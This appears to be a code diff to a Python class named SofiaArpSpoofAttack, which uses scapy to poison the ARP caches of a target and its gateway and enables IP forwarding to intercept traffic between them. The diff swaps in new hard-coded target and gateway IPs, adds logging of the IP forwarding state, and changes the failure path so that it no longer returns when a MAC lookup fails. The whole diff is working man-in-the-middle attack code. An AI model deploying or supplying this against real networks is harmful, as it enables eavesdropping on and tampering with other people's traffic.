@@ -13,8 +13,8 @@ class SofiaArpSpoofAttack(QObject):
 		self.loop = loop
 		self.done = False
 		self.append_log = append_log
-		self.g_target_ip = "192.168.1.176" # Enter your target IP
-		self.g_gateway_ip = "192.168.1.1" # Enter your gateway's IP
+		self.g_target_ip = "192.168.43.154" # Enter your target IP
+		self.g_gateway_ip = "192.168.43.1" # Enter your gateway's IP
 		self.iface = "wlan0"
 
 	def get_mac(self, ip):
@@ -48,6 +48,7 @@ class SofiaArpSpoofAttack(QObject):
 		scapy.send(scapy.ARP(op = 2, pdst=self.g_gateway_ip, hwdst=self.gw_mac, psrc=self.g_target_ip, hwsrc=self.target_mac), verbose=False)
 		scapy.send(scapy.ARP(op = 2, pdst=self.g_target_ip, hwdst=self.target_mac, psrc=self.g_gateway_ip, hwsrc=self.gw_mac), verbose=False)
 		self.disable_ip_forward()
+		self.check_ip_forward()
 
 	def enable_ip_forward(self):
 		import os
@@ -57,16 +58,22 @@ class SofiaArpSpoofAttack(QObject):
 		import os
 		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
 
+	def check_ip_forward(self):
+		with open("/proc/sys/net/ipv4/ip_forward", "r") as file:
+			self.append_log(f"IP FORWARD = {file.read()}")
+
 	def run(self):
 
 		self.enable_ip_forward()
+		self.check_ip_forward()
 
 		self.append_log(f"[ARP] Starting the attack: loop={self.loop}")
 		self.gw_mac = self.get_mac(self.g_gateway_ip)
 		self.target_mac = self.get_mac(self.g_target_ip)
 		if not self.gw_mac or not self.target_mac:
 			self.append_log(f"[ARP] Cannot get MAC of T={self.g_gateway_ip} or G={self.g_target_ip}")
-			return
+			self.finished.emit()
+			self.done = True
 
 		try:
 			sent_packets_count = 0
